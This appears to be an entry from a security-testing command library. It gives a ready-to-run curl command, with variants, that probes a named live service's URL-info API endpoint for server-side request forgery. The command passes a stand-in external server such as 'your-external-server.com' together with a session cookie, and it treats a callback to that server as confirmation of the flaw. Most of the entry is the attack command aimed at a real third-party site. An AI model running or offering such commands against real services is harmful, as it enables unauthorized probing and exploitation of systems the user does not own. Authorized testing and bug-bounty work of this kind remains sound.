---
id: cmd-curl-external-ssrf-001
data: >-
  curl -X GET
  "https://www.tumblr.com/api/v2/url_info?url=http://your-external-server.com/test&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary"
  -H "Host: www.tumblr.com" -H "Cookie: your-session-cookie"
tags:
  - ssrf
  - test
  - api
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:39:09.724Z'
verified: false
validated: true
submitted: true
---
# curl-external-ssrf-test

## Command

```bash
curl -X GET "https://www.tumblr.com/api/v2/url_info?url=http://your-external-server.com/test&fields%5Bblogs%5D=avatar%2Cname%2Ctitle%2Curl%2Cdescription_npf%2Ctheme%2Cuuid%2Ccan_be_followed%2C%3Ffollowed%2C%3Fis_member%2Cshare_likes%2Cshare_following%2Ccan_subscribe%2Ccan_message%2Csubscribed%2Cask%2C%3Fcan_submit%2C%3Fis_blocked_from_primary%2C%3Fadvertiser_name%2C%3Ftop_tags%2C%3Fprimary" -H "Host: www.tumblr.com" -H "Cookie: your-session-cookie"
```

## Description

Sends a modified GET request to Tumblr's vulnerable API endpoint with an external URL in the 'url' parameter to test SSRF, requiring a valid session cookie for authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X GET` | Specifies HTTP method | Yes |
| `url=...` | Target URL for SSRF (external server) | Yes |
| `-H "Cookie: ..."` | Auth session cookie | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.tumblr.com/api/v2/url_info?url=http://your-server.com/test" -H "Cookie: session=abc123"
```

### Advanced Usage

Add verbose output:

```bash
curl -v -X GET "https://www.tumblr.com/api/v2/url_info?url=http://your-server.com/test&fields%5Bblogs%5D=..." -H "Host: www.tumblr.com" -H "Cookie: session=abc123"
```

## Expected Output

HTTP/1.1 200 OK with JSON response containing blog info or error, but the key is the callback on your server confirming SSRF.

## Related

- [[Related Procedure: Test-External-SSRF-with-Attacker-Server]]
